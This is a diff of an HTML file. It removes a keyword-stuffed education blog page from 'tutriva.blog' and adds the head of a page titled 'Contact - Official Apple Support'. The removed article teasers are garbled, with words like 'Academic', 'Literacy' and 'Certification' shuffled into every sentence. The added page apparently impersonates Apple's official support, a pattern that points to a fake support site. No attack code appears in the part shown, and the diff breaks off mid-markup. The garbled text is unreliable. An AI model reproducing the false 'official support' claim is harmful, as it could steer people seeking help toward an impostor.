@@ -1,10 +1,334 @@
-<html><head><meta charset="UTF-8" class="btn-SnRrLReRZSxgEzVl"/><link rel="stylesheet" href="styles.css" class="all-kMBavGzEM"/><meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no" class="btn-dVTcMylxghKh"/><meta name="referrer" content="no-referrer" class="page-OTkvKpPIcVnLhhPL"/><style> @import url('https://fonts.googleapis.com/css2?family=Nunito+Sans:ital,opsz,wght@0,6..12,200..1000;1,6..12,200..1000&display=swap'); html,body{overflow-x: hidden;} *{margin:0;padding:0;} *::-webkit-scrollbar { background-color: #554e38; border-radius: 48px; } *::-webkit-scrollbar-thumb { background-color: #f9bea3; border-radius: 48px; border: 3px solid #554e38; } a{text-decoration:none} p,li{text-indent: calc(30vw/var(--resizer)*100)} ol{padding-left: calc(30vw/var(--resizer)*100)} h2{text-align: center;} input{outline: none;} #close:checked ~ section {display: none !important;} input::placeholder {color: inherit;} :root { --resizer: 1440; } @media screen and (max-width:414px) { :root { --resizer: 350; } } </style><title>tutriva.blog</title><!-- Google tag (gtag.js) -->
-<script async src="https://www.googletagmanager.com/gtag/js?id=G-0LY0HY7L01"></script>
+<!DOCTYPE html><html lang="en"><head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta http-equiv="cache-control" content="max-age=3600">
+    <title>Contact - Official Apple Support</title>
+    <link rel="apple-touch-icon" href="images/favicon.ico">
+    <link rel="icon" type="image/png" href="images/favicon.ico">
+    <meta name="description" content="Contact Apple support by phone or chat, set up a repair, or make a Genius Bar appointment for iPhone, iPad, Mac and more.">
+
+    <!-- Bootstrap 5 CSS -->
+    <link href="css/bootstrap.min.css" rel="stylesheet">
+    <link rel="stylesheet" href="css/bootstrap-icons.css">
+    <!-- Font Awesome -->
+    <link rel="stylesheet" href="css/all.min.css">
+    <link rel="stylesheet" href="css/Base.css" type="text/css">
+
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-2DMKRPGVF0"></script>
 <script>
   window.dataLayer = window.dataLayer || [];
   function gtag(){dataLayer.push(arguments);}
   gtag('js', new Date());
 
-  gtag('config', 'G-0LY0HY7L01');
+  gtag('config', 'G-2DMKRPGVF0');
 </script>
-</head><body class="pic-oOVMQclpQlEKOf"><main class="wrapper-UPkzHraflGvhX"><div style="display: flex; position: relative; justify-content: space-between; align-items: center; width: 80%; height: max-content; margin: calc(0vw/var(--resizer)*100) auto calc(0vw/var(--resizer)*100) auto; padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; gap: undefined; flex-direction: row; background: inherit; background-color: #f9bea3; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'waves-7_92986'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(37px%2C%200)%20rotate(113deg)%20scale(0.6419187044655521)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-26px%2C%20-23px)%20rotate(143deg)%20scale(1.5798566802759204)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%2029px)%20rotate(153deg)%20scale(1.0757667900978019)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'89413'%20patternUnits%3D'userSpaceOnUse'%20width%3D'35.584'%20height%3D'30.585'%20patternTransform%3D'scale(9)%20rotate(106)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23f2eaf7'%2F%3E%3Cpath%20d%3D'M36.908%209.243c-5.014%200-7.266%203.575-7.266%207.117%200%203.376%202.45%205.726%205.959%205.726%201.307%200%202.45-.463%203.244-1.307.744-.811%201.125-1.903%201.042-3.095-.066-.811-.546-1.655-1.274-2.185-.596-.447-1.639-.894-3.162-.546-.48.1-.778.58-.662%201.06.1.48.58.777%201.06.661.695-.149%201.274-.066%201.705.249.364.265.546.645.562.893.05.679-.165%201.308-.579%201.755-.446.48-1.125.744-1.936.744-2.55%200-4.188-1.538-4.188-3.938%200-2.466%201.44-5.347%205.495-5.347%202.897%200%206.008%201.888%206.388%206.058.166%201.804.067%205.147-2.598%207.034a.868.868%200%2000-.142.122c-1.311.783-2.87%201.301-4.972%201.301-4.088%200-6.123-1.952-8.275-4.021-2.317-2.218-4.7-4.518-9.517-4.518-4.094%200-6.439%201.676-8.479%203.545.227-1.102.289-2.307.17-3.596-.496-5.263-4.567-7.662-8.159-7.662-5.015%200-7.265%203.574-7.265%207.116%200%203.377%202.45%205.727%205.958%205.727%201.307%200%202.449-.463%203.243-1.308.745-.81%201.126-1.903%201.043-3.095-.066-.81-.546-1.654-1.274-2.184-.596-.447-1.639-.894-3.161-.546-.48.1-.778.58-.662%201.06.099.48.579.777%201.059.66.695-.148%201.275-.065%201.705.25.364.264.546.645.563.893.05.679-.166%201.307-.58%201.754-.447.48-1.125.745-1.936.745-2.549%200-4.188-1.539-4.188-3.939%200-2.466%201.44-5.345%205.495-5.345%202.897%200%206.008%201.87%206.389%206.057.163%201.781.064%205.06-2.504%206.96-1.36.864-2.978%201.447-5.209%201.447-4.088%200-6.124-1.952-8.275-4.021-2.317-2.218-4.7-4.518-9.516-4.518v1.787c4.088%200%206.123%201.953%208.275%204.022%202.317%202.218%204.7%204.518%209.516%204.518%204.8%200%207.2-2.3%209.517-4.518%202.151-2.069%204.187-4.022%208.275-4.022s6.124%201.953%208.275%204.022c2.318%202.218%204.701%204.518%209.517%204.518%204.8%200%207.2-2.3%209.516-4.518%202.152-2.069%204.188-4.022%208.276-4.022s6.123%201.953%208.275%204.022c2.317%202.218%204.7%204.518%209.517%204.518v-1.788c-4.088%200-6.124-1.952-8.275-4.021-2.318-2.218-4.701-4.518-9.517-4.518-4.103%200-6.45%201.683-8.492%203.556.237-1.118.304-2.343.184-3.656-.497-5.263-4.568-7.663-8.16-7.663z'%20class%3D'float2'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23f9bea3'%2F%3E%3Cpath%20d%3D'M23.42%2041.086a.896.896%200%2001-.729-.38.883.883%200%2001.215-1.242c2.665-1.887%202.764-5.23%202.599-7.034-.38-4.187-3.492-6.058-6.389-6.058-4.055%200-5.495%202.88-5.495%205.346%200%202.4%201.639%203.94%204.188%203.94.81%200%201.49-.265%201.936-.745.414-.447.63-1.076.58-1.755-.017-.248-.2-.629-.547-.893-.43-.315-1.026-.398-1.704-.249a.868.868%200%2001-1.06-.662.868.868%200%2001.662-1.059c1.523-.348%202.566.1%203.161.546.729.53%201.209%201.374%201.275%202.185.083%201.191-.298%202.284-1.043%203.095-.794.844-1.936%201.307-3.244%201.307-3.508%200-5.958-2.35-5.958-5.726%200-3.542%202.25-7.117%207.266-7.117%203.591%200%207.663%202.4%208.16%207.663.347%203.79-.828%206.868-3.344%208.656a.824.824%200%2001-.53.182zm0-30.585a.896.896%200%2001-.729-.38.883.883%200%2001.215-1.242c2.665-1.887%202.764-5.23%202.599-7.034-.381-4.187-3.493-6.058-6.389-6.058-4.055%200-5.495%202.88-5.495%205.346%200%202.4%201.639%203.94%204.188%203.94.81%200%201.49-.266%201.936-.746.414-.446.629-1.075.58-1.754-.017-.248-.2-.629-.547-.894-.43-.314-1.026-.397-1.705-.248A.868.868%200%200117.014.77a.868.868%200%2001.662-1.06c1.523-.347%202.566.1%203.161.547.729.53%201.209%201.374%201.275%202.185.083%201.191-.298%202.284-1.043%203.095-.794.844-1.936%201.307-3.244%201.307-3.508%200-5.958-2.35-5.958-5.726%200-3.542%202.25-7.117%207.266-7.117%203.591%200%207.663%202.4%208.16%207.663.347%203.79-.828%206.868-3.344%208.656a.824.824%200%2001-.53.182zm29.956%201.572c-4.8%200-7.2-2.3-9.517-4.518-2.151-2.069-4.187-4.022-8.275-4.022S29.46%205.486%2027.31%207.555c-2.317%202.218-4.7%204.518-9.517%204.518-4.8%200-7.2-2.3-9.516-4.518C6.124%205.486%204.088%203.533%200%203.533s-6.124%201.953-8.275%204.022c-2.317%202.218-4.7%204.518-9.517%204.518-4.8%200-7.2-2.3-9.516-4.518-2.152-2.069-4.188-4.022-8.276-4.022V1.746c4.8%200%207.2%202.3%209.517%204.518%202.152%202.069%204.187%204.022%208.275%204.022s6.124-1.953%208.276-4.022C-7.2%204.046-4.816%201.746%200%201.746c4.8%200%207.2%202.3%209.517%204.518%202.151%202.069%204.187%204.022%208.275%204.022s6.124-1.953%208.275-4.022c2.318-2.218%204.7-4.518%209.517-4.518%204.8%200%207.2%202.3%209.517%204.518%202.151%202.069%204.187%204.022%208.275%204.022s6.124-1.953%208.275-4.022c2.317-2.218%204.7-4.518%209.517-4.518v1.787c-4.088%200-6.124%201.953-8.275%204.022-2.317%202.234-4.717%204.518-9.517%204.518z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23f9bea3'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-175%2C-123)'%20fill%3D'url(%2389413)'%2F%3E%3C%2Fsvg%3E&quot;);" class="container-VCXEeDIDWZZRnhkz"><div class="medium-QdqWVJFH"><div class="box-TFyQFyQbBE"><img src="./img/b425c0af37b73bcea0c431c2c3a46d39d6e95947.jpg" class="more-LbBqyZVDabikKx"/></div></div><div class="image-NTIQzmgUTE"><div class="text-KLbENxGmWuwUa"><h3 class="tagline-dgIemdxZvMGiVXt">tutriva.blog</h3><span class="col-qgpUcUC">Academic This Study Reading article Training examines Literacy Skills Innovation the advantages of bilingual education, its impact Research on Writing cognitive Learning Examination Certification development, and Knowledge the broader Curriculum Teaching societal benefits.</span></div><div class="thumbnail-GANrVWKdEWmVO"><a href="themelist0.html" class="tiny-LrQBZDulZCx"><span class="row-oOiUsnPIIOs">See details</span></a><a href="index.php" class="active-vXrOBydaZVjoryX"><span class="tip-dJauNbLf">Send</span></a></div></div></div><div class="picture-fBIWlcjsyk"><div class="picture-AcIvLFe"><div class="column-RaAlbnrra"><h3 class="preview-MQZMCj">Photos collection</h3></div></div><div class="wrapper-FVUnkzJqsztweBE"><div class="wrapper-YPtYWTaVrhfIy"><img src="./img/c49b828c21af49fe87daf79db15e93a53bebea26.jpg" class="sidebar-fOXExCSq"/><img src="./img/05d95ddb0ef7e3c25416b2400640cd9739384938.jpg" class="tiny-XQWdZFdbXmaAruIc"/><img src="./img/014f82e8d1b148d425182f855fc1f439de47661d.jpg" class="text-QaOccXwGmqQxRu"/><img src="./img/d4ddd6157b1b8f51d44aed07134072e6d1119947.jpg" class="headline-YrnUZfSrKV"/><img src="./img/3f4510d4fd3688a81911cfa525b6ded85993efaf.jpg" class="title-dtnEDwk"/><img src="./img/2b621a89d965c4dc4df0ce6f0e935e98dda1ea6c.jpg" class="avatar-YUPsHS"/><img src="./img/6d53bb0cdf801f3919aabf54c1ca48cf354b15bf.jpg" class="icon-ipeSIvGQaKvI"/><img src="./img/b74fd0995e181fcd6cfa55f3e1e0c3b12035c6dd.jpg" class="pic-AHbenWEYld"/></div></div></div><div style="display: flex; position: relative; justify-content: center; align-items: center; min-width: 80%; gap: calc(36vw/var(--resizer)*100); padding: calc(50vw/var(--resizer)*100) 10% calc(50vw/var(--resizer)*100) 10%; flex-direction: column; background-color: #f2eaf7; background-image: url(&quot;data:image/svg+xml,%3Csvg%20id%3D'waves-7_92986'%20width%3D'100%25'%20height%3D'1000px'%20xmlns%3D'http%3A%2F%2Fwww.w3.org%2F2000%2Fsvg'%3E%3Cdefs%3E%3Cstyle%3E%0A%20%20%20%20%40keyframes%20float1%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(37px%2C%200)%20rotate(113deg)%20scale(0.6419187044655521)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float1%20%7B%0A%20%20%20%20%20%20animation%3A%20float1%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float2%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(-26px%2C%20-23px)%20rotate(143deg)%20scale(1.5798566802759204)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float2%20%7B%0A%20%20%20%20%20%20animation%3A%20float2%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%20%20%40keyframes%20float3%20%7B%0A%20%20%20%20%20%200%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%2050%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%2029px)%20rotate(153deg)%20scale(1.0757667900978019)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20100%25%20%7B%0A%20%20%20%20%20%20%20%20transform%3A%20translate(0%2C%200)%3B%0A%20%20%20%20%20%20%7D%0A%20%20%20%20%7D%0A%20%20%20%20.float3%20%7B%0A%20%20%20%20%20%20animation%3A%20float3%204s%20infinite%3B%0A%20%20%20%20%7D%0A%20%20%3C%2Fstyle%3E%3Cpattern%20id%3D'89413'%20patternUnits%3D'userSpaceOnUse'%20width%3D'35.584'%20height%3D'30.585'%20patternTransform%3D'scale(9)%20rotate(106)'%3E%3Crect%20x%3D'0'%20y%3D'0'%20width%3D'100%25'%20height%3D'100%25'%20fill%3D'%23f2eaf7'%2F%3E%3Cpath%20d%3D'M36.908%209.243c-5.014%200-7.266%203.575-7.266%207.117%200%203.376%202.45%205.726%205.959%205.726%201.307%200%202.45-.463%203.244-1.307.744-.811%201.125-1.903%201.042-3.095-.066-.811-.546-1.655-1.274-2.185-.596-.447-1.639-.894-3.162-.546-.48.1-.778.58-.662%201.06.1.48.58.777%201.06.661.695-.149%201.274-.066%201.705.249.364.265.546.645.562.893.05.679-.165%201.308-.579%201.755-.446.48-1.125.744-1.936.744-2.55%200-4.188-1.538-4.188-3.938%200-2.466%201.44-5.347%205.495-5.347%202.897%200%206.008%201.888%206.388%206.058.166%201.804.067%205.147-2.598%207.034a.868.868%200%2000-.142.122c-1.311.783-2.87%201.301-4.972%201.301-4.088%200-6.123-1.952-8.275-4.021-2.317-2.218-4.7-4.518-9.517-4.518-4.094%200-6.439%201.676-8.479%203.545.227-1.102.289-2.307.17-3.596-.496-5.263-4.567-7.662-8.159-7.662-5.015%200-7.265%203.574-7.265%207.116%200%203.377%202.45%205.727%205.958%205.727%201.307%200%202.449-.463%203.243-1.308.745-.81%201.126-1.903%201.043-3.095-.066-.81-.546-1.654-1.274-2.184-.596-.447-1.639-.894-3.161-.546-.48.1-.778.58-.662%201.06.099.48.579.777%201.059.66.695-.148%201.275-.065%201.705.25.364.264.546.645.563.893.05.679-.166%201.307-.58%201.754-.447.48-1.125.745-1.936.745-2.549%200-4.188-1.539-4.188-3.939%200-2.466%201.44-5.345%205.495-5.345%202.897%200%206.008%201.87%206.389%206.057.163%201.781.064%205.06-2.504%206.96-1.36.864-2.978%201.447-5.209%201.447-4.088%200-6.124-1.952-8.275-4.021-2.317-2.218-4.7-4.518-9.516-4.518v1.787c4.088%200%206.123%201.953%208.275%204.022%202.317%202.218%204.7%204.518%209.516%204.518%204.8%200%207.2-2.3%209.517-4.518%202.151-2.069%204.187-4.022%208.275-4.022s6.124%201.953%208.275%204.022c2.318%202.218%204.701%204.518%209.517%204.518%204.8%200%207.2-2.3%209.516-4.518%202.152-2.069%204.188-4.022%208.276-4.022s6.123%201.953%208.275%204.022c2.317%202.218%204.7%204.518%209.517%204.518v-1.788c-4.088%200-6.124-1.952-8.275-4.021-2.318-2.218-4.701-4.518-9.517-4.518-4.103%200-6.45%201.683-8.492%203.556.237-1.118.304-2.343.184-3.656-.497-5.263-4.568-7.663-8.16-7.663z'%20class%3D'float2'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23f9bea3'%2F%3E%3Cpath%20d%3D'M23.42%2041.086a.896.896%200%2001-.729-.38.883.883%200%2001.215-1.242c2.665-1.887%202.764-5.23%202.599-7.034-.38-4.187-3.492-6.058-6.389-6.058-4.055%200-5.495%202.88-5.495%205.346%200%202.4%201.639%203.94%204.188%203.94.81%200%201.49-.265%201.936-.745.414-.447.63-1.076.58-1.755-.017-.248-.2-.629-.547-.893-.43-.315-1.026-.398-1.704-.249a.868.868%200%2001-1.06-.662.868.868%200%2001.662-1.059c1.523-.348%202.566.1%203.161.546.729.53%201.209%201.374%201.275%202.185.083%201.191-.298%202.284-1.043%203.095-.794.844-1.936%201.307-3.244%201.307-3.508%200-5.958-2.35-5.958-5.726%200-3.542%202.25-7.117%207.266-7.117%203.591%200%207.663%202.4%208.16%207.663.347%203.79-.828%206.868-3.344%208.656a.824.824%200%2001-.53.182zm0-30.585a.896.896%200%2001-.729-.38.883.883%200%2001.215-1.242c2.665-1.887%202.764-5.23%202.599-7.034-.381-4.187-3.493-6.058-6.389-6.058-4.055%200-5.495%202.88-5.495%205.346%200%202.4%201.639%203.94%204.188%203.94.81%200%201.49-.266%201.936-.746.414-.446.629-1.075.58-1.754-.017-.248-.2-.629-.547-.894-.43-.314-1.026-.397-1.705-.248A.868.868%200%200117.014.77a.868.868%200%2001.662-1.06c1.523-.347%202.566.1%203.161.547.729.53%201.209%201.374%201.275%202.185.083%201.191-.298%202.284-1.043%203.095-.794.844-1.936%201.307-3.244%201.307-3.508%200-5.958-2.35-5.958-5.726%200-3.542%202.25-7.117%207.266-7.117%203.591%200%207.663%202.4%208.16%207.663.347%203.79-.828%206.868-3.344%208.656a.824.824%200%2001-.53.182zm29.956%201.572c-4.8%200-7.2-2.3-9.517-4.518-2.151-2.069-4.187-4.022-8.275-4.022S29.46%205.486%2027.31%207.555c-2.317%202.218-4.7%204.518-9.517%204.518-4.8%200-7.2-2.3-9.516-4.518C6.124%205.486%204.088%203.533%200%203.533s-6.124%201.953-8.275%204.022c-2.317%202.218-4.7%204.518-9.517%204.518-4.8%200-7.2-2.3-9.516-4.518-2.152-2.069-4.188-4.022-8.276-4.022V1.746c4.8%200%207.2%202.3%209.517%204.518%202.152%202.069%204.187%204.022%208.275%204.022s6.124-1.953%208.276-4.022C-7.2%204.046-4.816%201.746%200%201.746c4.8%200%207.2%202.3%209.517%204.518%202.151%202.069%204.187%204.022%208.275%204.022s6.124-1.953%208.275-4.022c2.318-2.218%204.7-4.518%209.517-4.518%204.8%200%207.2%202.3%209.517%204.518%202.151%202.069%204.187%204.022%208.275%204.022s6.124-1.953%208.275-4.022c2.317-2.218%204.7-4.518%209.517-4.518v1.787c-4.088%200-6.124%201.953-8.275%204.022-2.317%202.234-4.717%204.518-9.517%204.518z'%20class%3D'float1'%20style%3D'opacity%3A%20.15'%20%20stroke-width%3D'1'%20stroke%3D'none'%20fill%3D'%23f9bea3'%2F%3E%3C%2Fpattern%3E%3C%2Fdefs%3E%3Crect%20width%3D'800%25'%20height%3D'800%25'%20transform%3D'translate(-175%2C-123)'%20fill%3D'url(%2389413)'%2F%3E%3C%2Fsvg%3E&quot;);" class="active-wKVzGbUhXbjzqNu"><div class="image-ICVikOUEAcWcYlA"><div class="img-TbySlTfyBl"><h3 class="xl-oypCWmvSLMpf">Article library</h3></div></div><div class="col-oQkYEFiyxbUXvgk"><div class="xs-EenHIHAxodzg"><div class="title-jDLVWQOJUiiPs"><div class="narrow-AUqbLVFffejQaMl"><div class="heading-RFBgapUmqjNv"><div class="img-lLoGKwXEgCeqaj"><span class="sm-DsAewPVvjo">29 June 2025</span></div></div><div class="current-EEjbAo"><div class="img-fDwVWHf"><span class="breadcrumbs-lgkCEAWVOcVEzxGs">Sophia Martinez</span></div></div></div><div class="tip-xCzpOpZeIZPuE"><a href="themelist1.html" class="thumbnail-lbxgJfJwTBNti"><span class="picture-pOFFRWHnHXT">Show all</span></a><a href="index.php" class="text-ZCOolltY"><span class="wrap-veBKDSyIgRjufnZ">Share</span></a></div><div class="preview-LfziGkEW"><h5 class="desc-JNiUPwIILK">Cultivating Creativity in Education: Techniques for Inspiring Young Minds</h5><div class="large-YvIzzsF"><span class="large-ODYrycIwafziRAwT">This article explores various Examination Reading Writing techniques to foster creativity Study in Curriculum educational settings, Literacy emphasizing Teaching Academic the Certification importance Innovation of creative thinking, collaboration, and Learning a supportive Training Knowledge Skills environment for students. Research</span></div></div></div><div class="userpic-unAyqdH"><div class="holder-BEGXWE"><img src="./img/634e736d19ee0b45feb2c2ac20f325aeed5f847b.jpg" class="column-SKBWOtVYbFzkxGs"/></div></div></div><div class="heading-YJDJIEBrb"><div class="aside-ckEbjAkRaGtoSGq"><div class="container-UTRmUGSjH"><div class="sidebar-KGKVgFC"><div class="container-YipPHaJHRtv"><span class="col-ELkPpqVTLZI">04 September 2025</span></div></div><div class="xs-UVewxqEyzwl"><div class="grid-NehpydSweACBjEfQ"><span class="img-tJqMgLvWOVcAwNlQ">Samantha Lee</span></div></div></div><div class="inner-YTEYtfOxKxDRAZQa"><a href="themelist2.html" class="tooltip-lVohBQjmssnnCM"><span class="wide-FjSzJKZmN">Show all</span></a><a href="index.php" class="tooltip-HZSUjsmqQLrg"><span class="subtitle-iViBNWasgpd">Share</span></a></div><div class="wrap-UEuZxVAnkaWzuEGm"><h5 class="box-ckSJdwDz">Empowering Educators: A Deep Dive into Professional Development Literature</h5><div class="thumb-MhpRQQzKjw"><span class="image-BoJVTULcHHZWKrSh">Learning This Examination Study Curriculum Research Skills article explores the Literacy significance Reading of professional development Writing books Knowledge for educators, highlighting their role Certification in Training enhancing teaching Academic practices and fostering Teaching continuous Innovation growth.</span></div></div></div><div class="medium-KZGChLlGd"><div class="title-uNWDfzvuYhy"><img src="./img/00f0beb15c21c0962dbd9c0e980aeb5d0547781d.jpg" class="subtitle-TlGckqIQ"/></div></div></div><div class="huge-msMhVDPCRhDku"><div class="wrapper-FwJaLden"><div class="xl-dJUwlHY"><div class="xs-JGjBNWTIdKGCguLV"><div class="grid-wRZgimDJdqEqX"><span class="grid-OYYzWLDCqXMq">16 September 2024</span></div></div><div class="heading-JgnnKUSUCeJV"><div class="medium-LTvFZeFVOz"><span class="heading-gCeZvTgpELHnGc">Oliver Bennett</span></div></div></div><div class="tagline-oyHbPNUfDhy"><a href="themelist3.html" class="widget-gxKKwoJuAor"><span class="control-aniNxs">Show all</span></a><a href="index.php" class="large-fWABPctaAjclKyg"><span class="tooltip-BIlyLuhAWBMl">Share</span></a></div><div class="control-TbnkuQFA"><h5 class="col-oghyXAs">Desks for Different Age Groups: Tailoring Classroom Furniture to Student Development</h5><div class="avatar-TnUOqmMGQ"><span class="wrap-OChaApP">Research This article explores Teaching Learning how Examination desk design varies Knowledge across Training different educational levels, from preschool to college, to Reading Certification Innovation Curriculum Writing meet Academic the physical and cognitive Study needs of students at each stage of development. It highlights the Literacy importance of age-appropriate furniture for enhancing learning and student Skills well-being.</span></div></div></div><div class="holder-oMDNzOEQJpC"><div class="huge-iuWuUkeCAQRrY"><img src="./img/c1645e2132f6c7d3cd49119c92074bec4a1d0a75.jpg" class="col-uwkCfKJP"/></div></div></div><div class="sidebar-cutTNonLMGIKHZ"><div class="container-jepTgiK"><div class="more-jnpPhYVLywNo"><div class="userpic-dAPRrYqpLNLdZjL"><div class="page-XVixpLQClEyjsLxk"><span class="control-xBTWLZR">06 January 2025</span></div></div><div class="more-VMzLUpOyK"><div class="title-XcxNsvCjYRYkkxd"><span class="desc-INyBxJdtMPW">Sophie Martinez</span></div></div></div><div class="img-mJaalka"><a href="themelist4.html" class="content-pAzygG"><span class="btn-rsSjrw">Show all</span></a><a href="index.php" class="inner-SDrIlKmMWVYnFEXq"><span class="wide-CmJfFGgqDfOl">Share</span></a></div><div class="narrow-ywJpkeLnGc"><h5 class="row-wDDwAIkjHPiAr">Nurturing Curiosity: The Key to Effective Learning</h5><div class="big-nUPhWKGUscCFR"><span class="picture-bivFJPWEJGAHhBrm">Explore Research how Innovation Reading Literacy Academic fostering curiosity Skills in students enhances Training their Examination learning experiences and prepares Certification Teaching Knowledge them Study for a lifetime Learning Curriculum of exploration. Writing</span></div></div></div><div class="section-dprJgNYQNNZOdeTR"><div class="icon-BpQZMXWk"><img src="./img/01138985f1c194430857072912fa56efef24c240.jpg" class="page-jrKdnTqx"/></div></div></div><div class="icon-hbOSWGLswbtiyJ"><div class="large-qKYTosRLhEz"><div class="lg-RotRIfStPPlmgQPe"><div class="button-bccrzPmvNuGEDMt"><div class="img-IKCqFzgaAzcvi"><span class="avatar-NXSZPcCycCTxW">22 April 2025</span></div></div><div class="lg-SqqcDDtSbyrA"><div class="title-hHsEfSCQH"><span class="tagline-uyKYzyTsq">Oliver Smith</span></div></div></div><div class="image-iUMhvbGiZR"><a href="themelist5.html" class="picture-yZjAuZAyuvQ"><span class="subject-agrOeLYDt">Show all</span></a><a href="index.php" class="row-JAuNFrXvEMIgKGB"><span class="grid-yhqeZwaAtsmvCEK">Share</span></a></div><div class="large-sLNeEibAaTiMgW"><h5 class="all-AdwRUMJxQbrtJPD">The Evolution of Language Learning in the Digital Age</h5><div class="box-GcVatQltEj"><span class="active-IXQRAufrd">Literacy Reading This Learning article Innovation explores Skills Examination how Certification technology Training Curriculum Research Academic Teaching has Writing transformed language learning, highlighting innovative methods, tools, and Knowledge the impact on global communication. Study</span></div></div></div><div class="wrapper-AqFwygMRfJlbEjy"><div class="inner-bvmPPiEkdFkloiGG"><img src="./img/2a7a845dc6dc31ef3c8dab7239aff25c25e92c17.jpg" class="current-FlVqlQZdXebvNM"/></div></div></div><div class="subtitle-BunzGkk"><div class="button-WBsWOTVYS"><div class="huge-RcZnNAskHYjdB"><div class="sm-ptquljo"><div class="button-ZMGhyGnZ"><span class="narrow-TjwIMjt">27 November 2024</span></div></div><div class="breadcrumbs-MXXuuxKUPGiP"><div class="col-IBxiHlhAGJeNcavK"><span class="avatar-jBJJUSMqqrNcU">Liam O'Connor</span></div></div></div><div class="narrow-QGcKYUvTfjKL"><a href="themelist6.html" class="btn-EPutcAt"><span class="page-BRqLTsZioVxsDscO">Show all</span></a><a href="index.php" class="button-OQntnq"><span class="subject-EfrUvx">Share</span></a></div><div class="breadcrumbs-PBnlcDtOlxtk"><h5 class="box-jQCygt">Exploring the Benefits of Multilingualism in a Globalized World</h5><div class="all-lftOqIcvO"><span class="tooltip-PWrFsuglgsqAvg">This Teaching Writing article Reading Examination Curriculum discusses the advantages Innovation Research Knowledge of Learning being Academic Study multilingual, including Certification Skills cognitive, social, and professional Literacy benefits, as well Training as strategies for language learning.</span></div></div></div><div class="btn-YaAOnBzvkhgts"><div class="wrap-XSHMBmYsuxcPKQm"><img src="./img/bc6914638021621f833a5047540493e6e5567f26.jpg" class="current-QimOVcUUZbWzREZ"/></div></div></div><div class="lg-TYhBjIWKiKyZVXSk"><div class="current-WqAxtu"><div class="img-DecTCdPm"><div 